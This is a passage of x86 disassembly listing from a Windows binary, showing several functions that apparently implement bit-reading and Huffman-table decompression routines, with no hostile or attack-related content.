 1008f1c:	8b 5d f4             	mov    -0xc(%ebp),%ebx
 1008f1f:	8b 04 85 28 26 00 01 	mov    0x1002628(,%eax,4),%eax
 1008f26:	8d 34 f0             	lea    (%eax,%esi,8),%esi
 1008f29:	8b 45 fc             	mov    -0x4(%ebp),%eax
 1008f2c:	c1 e8 19             	shr    $0x19,%eax
 1008f2f:	3b 7d f8             	cmp    -0x8(%ebp),%edi
 1008f32:	0f be 84 10 b4 0d 00 	movsbl 0xdb4(%eax,%edx,1),%eax
 1008f39:	00 
 1008f3a:	89 45 10             	mov    %eax,0x10(%ebp)
 1008f3d:	0f 83 17 01 00 00    	jae    0x100905a
 1008f43:	8a 8c 10 34 0e 00 00 	mov    0xe34(%eax,%edx,1),%cl
 1008f4a:	8a 84 10 34 0e 00 00 	mov    0xe34(%eax,%edx,1),%al
 1008f51:	28 45 0b             	sub    %al,0xb(%ebp)
 1008f54:	d3 65 fc             	shll   %cl,-0x4(%ebp)
 1008f57:	80 7d 0b 00          	cmpb   $0x0,0xb(%ebp)
 1008f5b:	7f 19                	jg     0x1008f76
 1008f5d:	33 c0                	xor    %eax,%eax
 1008f5f:	8a 67 01             	mov    0x1(%edi),%ah
 1008f62:	33 c9                	xor    %ecx,%ecx
 1008f64:	8a 4d 0b             	mov    0xb(%ebp),%cl
 1008f67:	8a 07                	mov    (%edi),%al
 1008f69:	f7 d9                	neg    %ecx
 1008f6b:	d3 e0                	shl    %cl,%eax
 1008f6d:	09 45 fc             	or     %eax,-0x4(%ebp)
 1008f70:	47                   	inc    %edi
 1008f71:	47                   	inc    %edi
 1008f72:	80 45 0b 10          	addb   $0x10,0xb(%ebp)
 1008f76:	03 75 10             	add    0x10(%ebp),%esi
 1008f79:	eb 5a                	jmp    0x1008fd5
 1008f7b:	33 f6                	xor    %esi,%esi
 1008f7d:	eb a0                	jmp    0x1008f1f
 1008f7f:	84 c9                	test   %cl,%cl
 1008f81:	74 4b                	je     0x1008fce
 1008f83:	8b 75 fc             	mov    -0x4(%ebp),%esi
 1008f86:	6a 20                	push   $0x20
 1008f88:	59                   	pop    %ecx
 1008f89:	2b 4d 13             	sub    0x13(%ebp),%ecx
 1008f8c:	d3 ee                	shr    %cl,%esi
 1008f8e:	3b 7d f8             	cmp    -0x8(%ebp),%edi
 1008f91:	0f 83 c3 00 00 00    	jae    0x100905a
 1008f97:	8a 88 f0 25 00 01    	mov    0x10025f0(%eax),%cl
 1008f9d:	28 4d 0b             	sub    %cl,0xb(%ebp)
 1008fa0:	d3 65 fc             	shll   %cl,-0x4(%ebp)
 1008fa3:	80 7d 0b 00          	cmpb   $0x0,0xb(%ebp)
 1008fa7:	7f 19                	jg     0x1008fc2
 1008fa9:	33 db                	xor    %ebx,%ebx
 1008fab:	8a 7f 01             	mov    0x1(%edi),%bh
 1008fae:	33 c9                	xor    %ecx,%ecx
 1008fb0:	8a 4d 0b             	mov    0xb(%ebp),%cl
 1008fb3:	8a 1f                	mov    (%edi),%bl
 1008fb5:	f7 d9                	neg    %ecx
 1008fb7:	d3 e3                	shl    %cl,%ebx
 1008fb9:	09 5d fc             	or     %ebx,-0x4(%ebp)
 1008fbc:	47                   	inc    %edi
 1008fbd:	47                   	inc    %edi
 1008fbe:	80 45 0b 10          	addb   $0x10,0xb(%ebp)
 1008fc2:	03 34 85 28 26 00 01 	add    0x1002628(,%eax,4),%esi
 1008fc9:	8b 5d f4             	mov    -0xc(%ebp),%ebx
 1008fcc:	eb 07                	jmp    0x1008fd5
 1008fce:	8b 34 85 28 26 00 01 	mov    0x1002628(,%eax,4),%esi
 1008fd5:	8b 42 10             	mov    0x10(%edx),%eax
 1008fd8:	89 42 14             	mov    %eax,0x14(%edx)
 1008fdb:	8b 42 0c             	mov    0xc(%edx),%eax
 1008fde:	89 42 10             	mov    %eax,0x10(%edx)
 1008fe1:	eb 12                	jmp    0x1008ff5
 1008fe3:	84 c0                	test   %al,%al
 1008fe5:	0f be c8             	movsbl %al,%ecx
 1008fe8:	8d 4c 8a 0c          	lea    0xc(%edx,%ecx,4),%ecx
 1008fec:	8b 31                	mov    (%ecx),%esi
 1008fee:	74 08                	je     0x1008ff8
 1008ff0:	8b 42 0c             	mov    0xc(%edx),%eax
 1008ff3:	89 01                	mov    %eax,(%ecx)
 1008ff5:	89 72 0c             	mov    %esi,0xc(%edx)
 1008ff8:	8b 4d 0c             	mov    0xc(%ebp),%ecx
 1008ffb:	2b ce                	sub    %esi,%ecx
 1008ffd:	23 4a 08             	and    0x8(%edx),%ecx
 1009000:	8b 75 f0             	mov    -0x10(%ebp),%esi
 1009003:	43                   	inc    %ebx
 1009004:	43                   	inc    %ebx
 1009005:	03 ce                	add    %esi,%ecx
 1009007:	89 4d 10             	mov    %ecx,0x10(%ebp)
 100900a:	8a 01                	mov    (%ecx),%al
 100900c:	8b 4d 0c             	mov    0xc(%ebp),%ecx
 100900f:	ff 45 0c             	incl   0xc(%ebp)
 1009012:	88 04 0e             	mov    %al,(%esi,%ecx,1)
 1009015:	8b 4d 10             	mov    0x10(%ebp),%ecx
 1009018:	41                   	inc    %ecx
 1009019:	4b                   	dec    %ebx
 100901a:	85 db                	test   %ebx,%ebx
 100901c:	89 4d 10             	mov    %ecx,0x10(%ebp)
 100901f:	7f e9                	jg     0x100900a
 1009021:	8b 45 0c             	mov    0xc(%ebp),%eax
 1009024:	3b 45 ec             	cmp    -0x14(%ebp),%eax
 1009027:	0f 8c df fc ff ff    	jl     0x1008d0c
 100902d:	8a 4d 0b             	mov    0xb(%ebp),%cl
 1009030:	88 8a b4 2e 00 00    	mov    %cl,0x2eb4(%edx)
 1009036:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 1009039:	89 8a b0 2e 00 00    	mov    %ecx,0x2eb0(%edx)
 100903f:	8b 4a 08             	mov    0x8(%edx),%ecx
 1009042:	23 c8                	and    %eax,%ecx
 1009044:	2b 45 ec             	sub    -0x14(%ebp),%eax
 1009047:	89 ba 04 2b 00 00    	mov    %edi,0x2b04(%edx)
 100904d:	89 8a c0 2e 00 00    	mov    %ecx,0x2ec0(%edx)
 1009053:	5f                   	pop    %edi
 1009054:	5e                   	pop    %esi
 1009055:	5b                   	pop    %ebx
 1009056:	c9                   	leave
 1009057:	c2 0c 00             	ret    $0xc
 100905a:	83 c8 ff             	or     $0xffffffff,%eax
 100905d:	eb f4                	jmp    0x1009053
 100905f:	cc                   	int3
 1009060:	cc                   	int3
 1009061:	cc                   	int3
 1009062:	cc                   	int3
 1009063:	cc                   	int3
 1009064:	8b ff                	mov    %edi,%edi
 1009066:	55                   	push   %ebp
 1009067:	8b ec                	mov    %esp,%ebp
 1009069:	8b 55 08             	mov    0x8(%ebp),%edx
 100906c:	56                   	push   %esi
 100906d:	8b 75 0c             	mov    0xc(%ebp),%esi
 1009070:	b8 01 01 00 00       	mov    $0x101,%eax
 1009075:	3b f0                	cmp    %eax,%esi
 1009077:	7d 3c                	jge    0x10090b5
 1009079:	2b c6                	sub    %esi,%eax
 100907b:	3b 45 10             	cmp    0x10(%ebp),%eax
 100907e:	7c 03                	jl     0x1009083
 1009080:	8b 45 10             	mov    0x10(%ebp),%eax
 1009083:	50                   	push   %eax
 1009084:	56                   	push   %esi
 1009085:	e8 7c f8 ff ff       	call   0x1008906
 100908a:	83 f8 ff             	cmp    $0xffffffff,%eax
 100908d:	75 0e                	jne    0x100909d
 100908f:	c7 82 bc 2e 00 00 01 	movl   $0x1,0x2ebc(%edx)
 1009096:	00 00 00 
 1009099:	0b c0                	or     %eax,%eax
 100909b:	eb 22                	jmp    0x10090bf
 100909d:	2b f0                	sub    %eax,%esi
 100909f:	01 75 10             	add    %esi,0x10(%ebp)
 10090a2:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
 10090a6:	8b f0                	mov    %eax,%esi
 10090a8:	89 82 c0 2e 00 00    	mov    %eax,0x2ec0(%edx)
 10090ae:	7f 05                	jg     0x10090b5
 10090b0:	8b 45 10             	mov    0x10(%ebp),%eax
 10090b3:	eb 0a                	jmp    0x10090bf
 10090b5:	ff 75 10             	push   0x10(%ebp)
 10090b8:	56                   	push   %esi
 10090b9:	52                   	push   %edx
 10090ba:	e8 06 fc ff ff       	call   0x1008cc5
 10090bf:	5e                   	pop    %esi
 10090c0:	5d                   	pop    %ebp
 10090c1:	c2 0c 00             	ret    $0xc
 10090c4:	cc                   	int3
 10090c5:	cc                   	int3
 10090c6:	cc                   	int3
 10090c7:	cc                   	int3
 10090c8:	cc                   	int3
 10090c9:	8b ff                	mov    %edi,%edi
 10090cb:	55                   	push   %ebp
 10090cc:	8b ec                	mov    %esp,%ebp
 10090ce:	8b 45 08             	mov    0x8(%ebp),%eax
 10090d1:	57                   	push   %edi
 10090d2:	8b b8 0c 2b 00 00    	mov    0x2b0c(%eax),%edi
 10090d8:	85 ff                	test   %edi,%edi
 10090da:	74 38                	je     0x1009114
 10090dc:	8b 4d 0c             	mov    0xc(%ebp),%ecx
 10090df:	8b d1                	mov    %ecx,%edx
 10090e1:	56                   	push   %esi
 10090e2:	8b 75 10             	mov    0x10(%ebp),%esi
 10090e5:	c1 e9 02             	shr    $0x2,%ecx
 10090e8:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
 10090ea:	8b ca                	mov    %edx,%ecx
 10090ec:	83 e1 03             	and    $0x3,%ecx
 10090ef:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
 10090f1:	83 b8 c4 2e 00 00 00 	cmpl   $0x0,0x2ec4(%eax)
 10090f8:	5e                   	pop    %esi
 10090f9:	74 19                	je     0x1009114
 10090fb:	81 b8 cc 2e 00 00 00 	cmpl   $0x8000,0x2ecc(%eax)
 1009102:	80 00 00 
 1009105:	73 0d                	jae    0x1009114
 1009107:	52                   	push   %edx
 1009108:	ff b0 0c 2b 00 00    	push   0x2b0c(%eax)
 100910e:	50                   	push   %eax
 100910f:	e8 34 ec ff ff       	call   0x1007d48
 1009114:	5f                   	pop    %edi
 1009115:	5d                   	pop    %ebp
 1009116:	c2 0c 00             	ret    $0xc
 1009119:	cc                   	int3
 100911a:	cc                   	int3
 100911b:	cc                   	int3
 100911c:	cc                   	int3
 100911d:	cc                   	int3
 100911e:	8b ff                	mov    %edi,%edi
 1009120:	55                   	push   %ebp
 1009121:	8b ec                	mov    %esp,%ebp
 1009123:	81 ec e8 02 00 00    	sub    $0x2e8,%esp
 1009129:	a1 28 c0 00 01       	mov    0x100c028,%eax
 100912e:	56                   	push   %esi
 100912f:	89 45 fc             	mov    %eax,-0x4(%ebp)
 1009132:	8b 45 10             	mov    0x10(%ebp),%eax
 1009135:	57                   	push   %edi
 1009136:	8b f9                	mov    %ecx,%edi
 1009138:	89 bd 18 fd ff ff    	mov    %edi,-0x2e8(%ebp)
 100913e:	89 85 20 fd ff ff    	mov    %eax,-0x2e0(%ebp)
 1009144:	33 f6                	xor    %esi,%esi
 1009146:	6a 04                	push   $0x4
 1009148:	57                   	push   %edi
 1009149:	e8 11 f0 ff ff       	call   0x100815f
 100914e:	88 44 35 e4          	mov    %al,-0x1c(%ebp,%esi,1)
 1009152:	46                   	inc    %esi
 1009153:	83 fe 14             	cmp    $0x14,%esi
 1009156:	7c ee                	jl     0x1009146
 1009158:	83 bf bc 2e 00 00 00 	cmpl   $0x0,0x2ebc(%edi)
 100915f:	74 07                	je     0x1009168
 1009161:	33 c0                	xor    %eax,%eax
 1009163:	e9 b9 02 00 00       	jmp    0x1009421
 1009168:	53                   	push   %ebx
 1009169:	8d 85 28 ff ff ff    	lea    -0xd8(%ebp),%eax
 100916f:	50                   	push   %eax
 1009170:	8d 85 28 fd ff ff    	lea    -0x2d8(%ebp),%eax
 1009176:	50                   	push   %eax
 1009177:	6a 08                	push   $0x8
 1009179:	8d 45 e4             	lea    -0x1c(%ebp),%eax
 100917c:	50                   	push   %eax
 100917d:	6a 14                	push   $0x14
 100917f:	57                   	push   %edi
 1009180:	e8 d3 03 00 00       	call   0x1009558
 1009185:	33 f6                	xor    %esi,%esi
 1009187:	39 75 08             	cmp    %esi,0x8(%ebp)
 100918a:	0f 8e 85 02 00 00    	jle    0x1009415
 1009190:	8b 87 b0 2e 00 00    	mov    0x2eb0(%edi),%eax
 1009196:	33 c9                	xor    %ecx,%ecx
 1009198:	c1 e8 18             	shr    $0x18,%eax
 100919b:	41                   	inc    %ecx
 100919c:	3d 00 01 00 00       	cmp    $0x100,%eax
 10091a1:	73 0a                	jae    0x10091ad
 10091a3:	66 8b 9c 45 28 fd ff 	mov    -0x2d8(%ebp,%eax,2),%bx
 10091aa:	ff 
 10091ab:	eb 08                	jmp    0x10091b5
 10091ad:	89 8f bc 2e 00 00    	mov    %ecx,0x2ebc(%edi)
 10091b3:	33 db                	xor    %ebx,%ebx
 10091b5:	66 85 db             	test   %bx,%bx
 10091b8:	7d 46                	jge    0x1009200
 10091ba:	ba 00 00 80 00       	mov    $0x800000,%edx
 10091bf:	f7 db                	neg    %ebx
 10091c1:	85 97 b0 2e 00 00    	test   %edx,0x2eb0(%edi)
 10091c7:	0f bf c3             	movswl %bx,%eax
 10091ca:	74 13                	je     0x10091df
 10091cc:	8d 5c 00 01          	lea    0x1(%eax,%eax,1),%ebx
 10091d0:	83 fb 5e             	cmp    $0x5e,%ebx
 10091d3:	73 1c                	jae    0x10091f1
 10091d5:	66 8b 9c 85 2a ff ff 	mov    -0xd6(%ebp,%eax,4),%bx
 10091dc:	ff 
 10091dd:	eb 1a                	jmp    0x10091f9
 10091df:	8d 1c 00             	lea    (%eax,%eax,1),%ebx
 10091e2:	83 fb 5e             	cmp    $0x5e,%ebx
 10091e5:	73 0a                	jae    0x10091f1
 10091e7:	66 8b 9c 85 28 ff ff 	mov    -0xd8(%ebp,%eax,4),%bx
 10091ee:	ff 
 10091ef:	eb 08                	jmp    0x10091f9
 10091f1:	33 db                	xor    %ebx,%ebx
 10091f3:	89 8f bc 2e 00 00    	mov    %ecx,0x2ebc(%edi)
 10091f9:	d1 ea                	shr    $1,%edx
 10091fb:	66 85 db             	test   %bx,%bx
 10091fe:	7c bf                	jl     0x10091bf
 1009200:	66 83 fb 18          	cmp    $0x18,%bx
 1009204:	73 26                	jae    0x100922c
 1009206:	66 85 db             	test   %bx,%bx
 1009209:	7c 21                	jl     0x100922c
 100920b:	83 bf bc 2e 00 00 00 	cmpl   $0x0,0x2ebc(%edi)
 1009212:	0f 85 17 02 00 00    	jne    0x100942f
 1009218:	0f bf c3             	movswl %bx,%eax
 100921b:	0f b6 44 05 e4       	movzbl -0x1c(%ebp,%eax,1),%eax
 1009220:	50                   	push   %eax
 1009221:	57                   	push   %edi
 1009222:	e8 7c ee ff ff       	call   0x10080a3
 1009227:	33 c9                	xor    %ecx,%ecx
 1009229:	41                   	inc    %ecx
 100922a:	eb 06                	jmp    0x1009232
 100922c:	89 8f bc 2e 00 00    	mov    %ecx,0x2ebc(%edi)
 1009232:	83 bf bc 2e 00 00 00 	cmpl   $0x0,0x2ebc(%edi)
 1009239:	0f 85 f0 01 00 00    	jne    0x100942f
 100923f:	66 83 fb 11          	cmp    $0x11,%bx
 1009243:	75 48                	jne    0x100928d
 1009245:	6a 04                	push   $0x4
 1009247:	57                   	push   %edi
 1009248:	e8 12 ef ff ff       	call   0x100815f
 100924d:	0f b6 d0             	movzbl %al,%edx
 1009250:	83 c2 04             	add    $0x4,%edx
 1009253:	8d 04 32             	lea    (%edx,%esi,1),%eax
 1009256:	3b 45 08             	cmp    0x8(%ebp),%eax
 1009259:	7c 05                	jl     0x1009260
 100925b:	8b 55 08             	mov    0x8(%ebp),%edx
 100925e:	2b d6                	sub    %esi,%edx
 1009260:	85 d2                	test   %edx,%edx
 1009262:	7e 23                	jle    0x1009287
 1009264:	8b 85 20 fd ff ff    	mov    -0x2e0(%ebp),%eax
 100926a:	8b ca                	mov    %edx,%ecx
 100926c:	8b d9                	mov    %ecx,%ebx
 100926e:	c1 e9 02             	shr    $0x2,%ecx
 1009271:	8d 3c 30             	lea    (%eax,%esi,1),%edi
 1009274:	33 c0                	xor    %eax,%eax
 1009276:	f3 ab                	rep stos %eax,%es:(%edi)
 1009278:	8b cb                	mov    %ebx,%ecx
 100927a:	83 e1 03             	and    $0x3,%ecx
 100927d:	f3 aa                	rep stos %al,%es:(%edi)
 100927f:	8b bd 18 fd ff ff    	mov    -0x2e8(%ebp),%edi
 1009285:	03 f2                	add    %edx,%esi
 1009287:	4e                   	dec    %esi
 1009288:	e9 7e 01 00 00       	jmp    0x100940b
 100928d:	66 83 fb 12          	cmp    $0x12,%bx
 1009291:	75 10                	jne    0x10092a3
 1009293:	6a 05                	push   $0x5
 1009295:	57                   	push   %edi
 1009296:	e8 c4 ee ff ff       	call   0x100815f
 100929b:	0f b6 d0             	movzbl %al,%edx
 100929e:	83 c2 14             	add    $0x14,%edx
 10092a1:	eb b0                	jmp    0x1009253
 10092a3:	66 83 fb 13          	cmp    $0x13,%bx
 10092a7:	0f 85 40 01 00 00    	jne    0x10093ed
 10092ad:	51                   	push   %ecx
 10092ae:	57                   	push   %edi
 10092af:	e8 ab ee ff ff       	call   0x100815f
 10092b4:	0f b6 d8             	movzbl %al,%ebx
 10092b7:	83 c3 04             	add    $0x4,%ebx
 10092ba:	8d 04 33             	lea    (%ebx,%esi,1),%eax
 10092bd:	3b 45 08             	cmp    0x8(%ebp),%eax
 10092c0:	7c 05                	jl     0x10092c7
 10092c2:	8b 5d 08             	mov    0x8(%ebp),%ebx
 10092c5:	2b de                	sub    %esi,%ebx
 10092c7:	8b 87 b0 2e 00 00    	mov    0x2eb0(%edi),%eax
 10092cd:	33 c9                	xor    %ecx,%ecx
 10092cf:	c1 e8 18             	shr    $0x18,%eax
 10092d2:	41                   	inc    %ecx
 10092d3:	3d 00 01 00 00       	cmp    $0x100,%eax
 10092d8:	73 11                	jae    0x10092eb
 10092da:	66 8b 84 45 28 fd ff 	mov    -0x2d8(%ebp,%eax,2),%ax
 10092e1:	ff 
 10092e2:	66 89 85 24 fd ff ff 	mov    %ax,-0x2dc(%ebp)
 10092e9:	eb 0d                	jmp    0x10092f8
 10092eb:	83 a5 24 fd ff ff 00 	andl   $0x0,-0x2dc(%ebp)
 10092f2:	89 8f bc 2e 00 00    	mov    %ecx,0x2ebc(%edi)
 10092f8:	66 83 bd 24 fd ff ff 	cmpw   $0x0,-0x2dc(%ebp)
 10092ff:	00 
 1009300:	7d 6e                	jge    0x1009370
 1009302:	c7 85 1c fd ff ff 00 	movl   $0x800000,-0x2e4(%ebp)
 1009309:	00 80 00 
 100930c:	8b 85 1c fd ff ff    	mov    -0x2e4(%ebp),%eax
 1009312:	f7 9d 24 fd ff ff    	negl   -0x2dc(%ebp)
 1009318:	85 87 b0 2e 00 00    	test   %eax,0x2eb0(%edi)
 100931e:	0f bf 85 24 fd ff ff 	movswl -0x2dc(%ebp),%eax
 1009325:	74 13                	je     0x100933a
 1009327:	8d 54 00 01          	lea    0x1(%eax,%eax,1),%edx
 100932b:	83 fa 5e             	cmp    $0x5e,%edx
 100932e:	73 23                	jae    0x1009353
 1009330:	66 8b 84 85 2a ff ff 	mov    -0xd6(%ebp,%eax,4),%ax
 1009337:	ff 
 1009338:	eb 10                	jmp    0x100934a
 100933a:	8d 14 00             	lea    (%eax,%eax,1),%edx
 100933d:	83 fa 5e             	cmp    $0x5e,%edx
 1009340:	73 11                	jae    0x1009353
 1009342:	66 8b 84 85 28 ff ff 	mov    -0xd8(%ebp,%eax,4),%ax
 1009349:	ff 
 100934a:	66 89 85 24 fd ff ff 	mov    %ax,-0x2dc(%ebp)
 1009351:	eb 0d                	jmp    0x1009360
 1009353:	83 a5 24 fd ff ff 00 	andl   $0x0,-0x2dc(%ebp)
 100935a:	89 8f bc 2e 00 00    	mov    %ecx,0x2ebc(%edi)
 1009360:	d1 ad 1c fd ff ff    	shrl   $1,-0x2e4(%ebp)
 1009366:	66 83 bd 24 fd ff ff 	cmpw   $0x0,-0x2dc(%ebp)
 100936d:	00 
 100936e:	7c 9c                	jl     0x100930c
 1009370:	66 83 bd 24 fd ff ff 	cmpw   $0x18,-0x2dc(%ebp)
 1009377:	18 
 1009378:	73 2c                	jae    0x10093a6
 100937a:	66 83 bd 24 fd ff ff 	cmpw   $0x0,-0x2dc(%ebp)
 1009381:	00 
 1009382:	7c 22                	jl     0x10093a6
 1009384:	83 bf bc 2e 00 00 00 	cmpl   $0x0,0x2ebc(%edi)
 100938b:	0f 85 9e 00 00 00    	jne    0x100942f
 1009391:	0f bf 85 24 fd ff ff 	movswl -0x2dc(%ebp),%eax
 1009398:	0f b6 44 05 e4       	movzbl -0x1c(%ebp,%eax,1),%eax
 100939d:	50                   	push   %eax
 100939e:	57                   	push   %edi
 100939f:	e8 ff ec ff ff       	call   0x10080a3
 10093a4:	eb 06                	jmp    0x10093ac
 10093a6:	89 8f bc 2e 00 00    	mov    %ecx,0x2ebc(%edi)
 10093ac:	83 bf bc 2e 00 00 00 	cmpl   $0x0,0x2ebc(%edi)
 10093b3:	75 7a                	jne    0x100942f
 10093b5:	8b 45 0c             	mov    0xc(%ebp),%eax
 10093b8:	0f b6 04 06          	movzbl (%esi,%eax,1),%eax
 10093bc:	0f bf 8d 24 fd ff ff 	movswl -0x2dc(%ebp),%ecx
 10093c3:	2b c1                	sub    %ecx,%eax
 10093c5:	83 c0 11             	add    $0x11,%eax
 10093c8:	6a 11                	push   $0x11
 10093ca:	99                   	cltd
 10093cb:	59                   	pop    %ecx
 10093cc:	f7 f9                	idiv   %ecx
 10093ce:	eb 14                	jmp    0x10093e4
 10093d0:	4b                   	dec    %ebx
 10093d1:	3b 75 08             	cmp    0x8(%ebp),%esi
 10093d4:	0f 8d ad fe ff ff    	jge    0x1009287
 10093da:	8b 85 20 fd ff ff    	mov    -0x2e0(%ebp),%eax
 10093e0:	88 14 30             	mov    %dl,(%eax,%esi,1)
 10093e3:	46                   	inc    %esi
 10093e4:	85 db                	test   %ebx,%ebx
 10093e6:	7f e8                	jg     0x10093d0
 10093e8:	e9 9a fe ff ff       	jmp    0x1009287
 10093ed:	8b 45 0c             	mov    0xc(%ebp),%eax
 10093f0:	0f b6 04 06          	movzbl (%esi,%eax,1),%eax
 10093f4:	0f bf cb             	movswl %bx,%ecx
 10093f7:	2b c1                	sub    %ecx,%eax
 10093f9:	83 c0 11             	add    $0x11,%eax
 10093fc:	99                   	cltd
 10093fd:	6a 11                	push   $0x11
 10093ff:	59                   	pop    %ecx
 1009400:	f7 f9                	idiv   %ecx
 1009402:	8b 85 20 fd ff ff    	mov    -0x2e0(%ebp),%eax
 1009408:	88 14 30             	mov    %dl,(%eax,%esi,1)
 100940b:	46                   	inc    %esi
 100940c:	3b 75 08             	cmp    0x8(%ebp),%esi
 100940f:	0f 8c 7b fd ff ff    	jl     0x1009190
 1009415:	33 c0                	xor    %eax,%eax
 1009417:	39 87 bc 2e 00 00    	cmp    %eax,0x2ebc(%edi)
 100941d:	0f 94 c0             	sete   %al
 1009420:	5b                   	pop    %ebx
 1009421:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 1009424:	5f                   	pop    %edi
 1009425:	5e                   	pop    %esi
 1009426:	e8 d4 ce ff ff       	call   0x10062ff
 100942b:	c9                   	leave
 100942c:	c2 0c 00             	ret    $0xc
 100942f:	33 c0                	xor    %eax,%eax
 1009431:	eb ed                	jmp    0x1009420
 1009433:	cc                   	int3
 1009434:	cc                   	int3
 1009435:	cc                   	int3
 1009436:	cc                   	int3
 1009437:	cc                   	int3
 1009438:	8b ff                	mov    %edi,%edi
 100943a:	55                   	push   %ebp
 100943b:	8b ec                	mov    %esp,%ebp
 100943d:	56                   	push   %esi
 100943e:	8b 75 08             	mov    0x8(%ebp),%esi
 1009441:	57                   	push   %edi
 1009442:	8d be 18 0a 00 00    	lea    0xa18(%esi),%edi
 1009448:	57                   	push   %edi
 1009449:	8d 86 14 2b 00 00    	lea    0x2b14(%esi),%eax
 100944f:	50                   	push   %eax
 1009450:	68 00 01 00 00       	push   $0x100
 1009455:	8b ce                	mov    %esi,%ecx
 1009457:	e8 c2 fc ff ff       	call   0x100911e
 100945c:	85 c0                	test   %eax,%eax
 100945e:	75 07                	jne    0x1009467
 1009460:	33 c0                	xor    %eax,%eax
 1009462:	e9 95 00 00 00       	jmp    0x10094fc
 1009467:	8d 86 18 0b 00 00    	lea    0xb18(%esi),%eax
 100946d:	50                   	push   %eax
 100946e:	8d 86 14 2c 00 00    	lea    0x2c14(%esi),%eax
 1009474:	50                   	push   %eax
 1009475:	0f b6 86 b5 2e 00 00 	movzbl 0x2eb5(%esi),%eax
 100947c:	c1 e0 03             	shl    $0x3,%eax
 100947f:	50                   	push   %eax
 1009480:	8b ce                	mov    %esi,%ecx
 1009482:	e8 97 fc ff ff       	call   0x100911e
 1009487:	85 c0                	test   %eax,%eax
 1009489:	74 d5                	je     0x1009460
 100948b:	0f b6 8e b5 2e 00 00 	movzbl 0x2eb5(%esi),%ecx
 1009492:	8d 0c cd 00 01 00 00 	lea    0x100(,%ecx,8),%ecx
 1009499:	b8 a0 02 00 00       	mov    $0x2a0,%eax
 100949e:	3b c8                	cmp    %eax,%ecx
 10094a0:	7d 02                	jge    0x10094a4
 10094a2:	8b c1                	mov    %ecx,%eax
 10094a4:	8d 8e 3c 0e 00 00    	lea    0xe3c(%esi),%ecx
 10094aa:	51                   	push   %ecx
 10094ab:	8d 4e 18             	lea    0x18(%esi),%ecx
 10094ae:	51                   	push   %ecx
 10094af:	6a 0a                	push   $0xa
 10094b1:	57                   	push   %edi
 10094b2:	50                   	push   %eax
 10094b3:	56                   	push   %esi
 10094b4:	e8 9f 00 00 00       	call   0x1009558
 10094b9:	85 c0                	test   %eax,%eax
 10094bb:	74 a3                	je     0x1009460
 10094bd:	53                   	push   %ebx
 10094be:	8d 9e b8 0c 00 00    	lea    0xcb8(%esi),%ebx
 10094c4:	53                   	push   %ebx
 10094c5:	8d 86 b4 2d 00 00    	lea    0x2db4(%esi),%eax
 10094cb:	50                   	push   %eax
 10094cc:	bf f9 00 00 00       	mov    $0xf9,%edi
 10094d1:	57                   	push   %edi
 10094d2:	8b ce                	mov    %esi,%ecx
 10094d4:	e8 45 fc ff ff       	call   0x100911e
 10094d9:	85 c0                	test   %eax,%eax
 10094db:	74 1e                	je     0x10094fb
 10094dd:	8d 86 3c 23 00 00    	lea    0x233c(%esi),%eax
 10094e3:	50                   	push   %eax
 10094e4:	8d 86 18 08 00 00    	lea    0x818(%esi),%eax
 10094ea:	50                   	push   %eax
 10094eb:	6a 08                	push   $0x8
 10094ed:	53                   	push   %ebx
 10094ee:	57                   	push   %edi
 10094ef:	56                   	push   %esi
 10094f0:	e8 63 00 00 00       	call   0x1009558
 10094f5:	f7 d8                	neg    %eax
 10094f7:	1b c0                	sbb    %eax,%eax
 10094f9:	f7 d8                	neg    %eax
 10094fb:	5b                   	pop    %ebx
 10094fc:	5f                   	pop    %edi
 10094fd:	5e                   	pop    %esi
 10094fe:	5d                   	pop    %ebp
 10094ff:	c2 04 00             	ret    $0x4
 1009502:	cc                   	int3
 1009503:	cc                   	int3
 1009504:	cc                   	int3
 1009505:	cc                   	int3
 1009506:	cc                   	int3
 1009507:	8b ff                	mov    %edi,%edi
 1009509:	55                   	push   %ebp
 100950a:	8b ec                	mov    %esp,%ebp
 100950c:	53                   	push   %ebx
 100950d:	56                   	push   %esi
 100950e:	8b 75 08             	mov    0x8(%ebp),%esi
 1009511:	57                   	push   %edi
 1009512:	33 db                	xor    %ebx,%ebx
 1009514:	8d be 34 0e 00 00    	lea    0xe34(%esi),%edi
 100951a:	6a 03                	push   $0x3
 100951c:	56                   	push   %esi
 100951d:	e8 3d ec ff ff       	call   0x100815f
 1009522:	88 04 1f             	mov    %al,(%edi,%ebx,1)
 1009525:	43                   	inc    %ebx
 1009526:	83 fb 08             	cmp    $0x8,%ebx
 1009529:	7c ef                	jl     0x100951a
 100952b:	83 be bc 2e 00 00 00 	cmpl   $0x0,0x2ebc(%esi)
 1009532:	74 04                	je     0x1009538
 1009534:	33 c0                	xor    %eax,%eax
 1009536:	eb 14                	jmp    0x100954c
 1009538:	8d 86 b4 0d 00 00    	lea    0xdb4(%esi),%eax
 100953e:	50                   	push   %eax
 100953f:	57                   	push   %edi
 1009540:	56                   	push   %esi
 1009541:	e8 23 02 00 00       	call   0x1009769
 1009546:	f7 d8                	neg    %eax
 1009548:	1b c0                	sbb    %eax,%eax
 100954a:	f7 d8                	neg    %eax
 100954c:	5f                   	pop    %edi
 100954d:	5e                   	pop    %esi
 100954e:	5b                   	pop    %ebx
 100954f:	5d                   	pop    %ebp
 1009550:	c2 04 00             	ret    $0x4
 1009553:	cc                   	int3
 1009554:	cc                   	int3
 1009555:	cc                   	int3
 1009556:	cc                   	int3
 1009557:	cc                   	int3
 1009558:	8b ff                	mov    %edi,%edi
 100955a:	55                   	push   %ebp
 100955b:	8b ec                	mov    %esp,%ebp
 100955d:	81 ec a0 00 00 00    	sub    $0xa0,%esp
 1009563:	56                   	push   %esi
 1009564:	57                   	push   %edi
 1009565:	6a 10                	push   $0x10
 1009567:	33 c0                	xor    %eax,%eax
 1009569:	59                   	pop    %ecx
 100956a:	8d bd 64 ff ff ff    	lea    -0x9c(%ebp),%edi
 1009570:	f3 ab                	rep stos %eax,%es:(%edi)
 1009572:	33 f6                	xor    %esi,%esi
 1009574:	33 c9                	xor    %ecx,%ecx
 1009576:	39 75 0c             	cmp    %esi,0xc(%ebp)
 1009579:	76 16                	jbe    0x1009591
 100957b:	8b 45 10             	mov    0x10(%ebp),%eax
 100957e:	0f b6 04 01          	movzbl (%ecx,%eax,1),%eax
